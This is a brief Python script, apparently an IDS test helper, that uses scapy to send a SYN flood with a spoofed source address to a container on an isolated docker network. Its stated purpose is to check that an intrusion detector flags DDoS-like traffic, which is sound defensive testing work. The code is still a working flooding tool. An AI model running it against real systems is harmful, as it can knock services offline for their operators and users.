"""
Temporary CLI attack-traffic generator for IDS end-to-end verification.
Sends a SYN flood on a SINGLE 5-tuple flow so it passes the min_packets
gate and exhibits DDoS-like features (high packet rate, high SYN count).

Runs INSIDE the backend container so the sniffer on eth0 captures it.
Safe: targets another container on the isolated docker bridge network.
"""
import argparse
import time
from scapy.all import IP, TCP, send


def syn_flood(src_ip: str, dst_ip: str, dport: int, sport: int, count: int, rate: int):
    interval = 1.0 / rate if rate > 0 else 0
    pkts_sent = 0
    for _ in range(count):
        pkt = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, flags="S")
        send(pkt, verbose=0)
        pkts_sent += 1
        if interval:
            time.sleep(interval)
    print(f"Sent {pkts_sent} SYN packets {src_ip}:{sport} -> {dst_ip}:{dport}")


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--src", default="10.99.88.77")
    p.add_argument("--dst", default="172.21.0.6")
    p.add_argument("--dport", type=int, default=80)
    p.add_argument("--sport", type=int, default=44444)
    p.add_argument("--count", type=int, default=300)
    p.add_argument("--rate", type=int, default=400)
    args = p.parse_args()
    syn_flood(args.src, args.dst, args.dport, args.sport, args.count, args.rate)
